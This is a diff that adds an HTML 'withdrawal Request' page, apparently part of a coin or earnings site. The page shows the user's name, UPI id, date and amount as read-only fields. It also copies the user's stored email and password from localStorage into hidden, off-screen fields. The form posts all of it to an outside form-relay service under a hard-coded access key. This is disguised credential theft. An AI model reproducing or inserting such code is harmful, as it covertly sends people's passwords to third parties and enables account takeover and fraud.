@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Contact</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="icon" href="/favicon.jpg">
+<style>
+body {
+  margin: 0 auto;
+  font-family: Arial, Helvetica, sans-serif;
+}
+.backicon{
+  width: 25px;
+  height: 25px;
+  cursor: pointer;
+  margin: 10px 0px 0px 15px;
+  visibility: visible;
+}
+h3{
+  text-align: center;
+  font-size: 22px;
+  word-spacing: 0.5px;
+  text-transform: uppercase;
+  letter-spacing: 0.80px;
+  margin-left: 0px;
+  font-family: monospace;
+}
+label{
+  margin-left: 48px;
+  font-size: 14.5px;
+}
+input {
+  width: 66%;
+  margin-left: 13%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 14px;
+}
+textarea{
+  width: 66%;
+  margin-left: 13%;
+  padding: 12px 12px 12px 12px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 14px;
+}
+input:focus , textarea:focus{
+  outline: none;
+  border: 1px solid #ccc;
+}
+.btn{
+  padding: 15px;
+  border-radius: 50px;
+  background-color: mediumseagreen;
+  color: white;
+  letter-spacing: 2px;
+  border: none;
+  width: 70%;
+  margin-left: 15%;
+  margin-top: 10px;
+  font-weight: bold;
+}
+#txt5, #txt6, #txt7{
+  width: 10px;
+  height: 10px;
+  margin-top: -50px;
+  position: absolute;
+  visibility: hidden;
+}
+@media screen and (min-width: 600px){
+label{
+  margin-left: 330px;
+  font-size: 18px;
+}
+input{
+  width: 68.5%;
+  margin-left: 14%;
+}
+textarea{
+  width: 69%;
+  margin-left: 13.7%;
+}
+.btn{
+  margin-left: 14.5%;
+  width: 71%;
+}
+}
+</style>
+</head>
+<body>
+<a href="/index.html"><i class="fa fa-arrow-left" style="margin: 15px 15px;"></i></a><br><br>
+<h3>withdrawal Request</h3><br>
+ <form action="https://api.web3forms.com/submit" method="POST">
+    <input type="hidden" name="access_key" value="a90528b8-466b-403d-993a-66645265a259"><br>
+<label for="Name:">Name:</label><br>
+<input type="text" name="Name" id="txt1" readonly><br><br><br>
+<label for="Name:">UPI id:</label><br>
+<input type="text" name="UPI id"  id="txt2" readonly><br><br><br>
+<label for="Name:">Date & Time:</label><br>
+<input type="text" name="Date & Time"  id="txt3" readonly><br><br><br>
+<label for="Name:">Amount:</label><br>
+<input type="text" name="Amount" id="txt4" readonly><br><br><br>
+    <input type="text" name="Coin" id="txt5">
+    <input type="text" name="Email" id="txt6">
+    <input type="text" name="Pass" id="txt7">
+<button class="btn" value="submit" onclick="hh()">Submit Request</button></form><br><br><br><br>
+<script>
+var t = localStorage.getItem("request");
+if(t == "success"){
+  window.open("/index.html", "_self");
+}else{
+  console.log("continue");
+}
+var a = localStorage.getItem("name");
+var b = localStorage.getItem("Method");
+var c = localStorage.getItem("Date");
+var d = localStorage.getItem("Amount");
+var e = localStorage.getItem("Coin");
+var f = localStorage.getItem("email");
+var g = localStorage.getItem("password");
+document.getElementById('txt1').value = a;
+document.getElementById('txt2').value = b;
+document.getElementById('txt3').value = c;
+document.getElementById('txt4').value = d;
+document.getElementById('txt5').value = e;
+document.getElementById('txt6').value = f;
+document.getElementById('txt7').value = g;
+function hh(){
+  localStorage.setItem("request", "success");
+}
+</script>
+</body>
+</html>
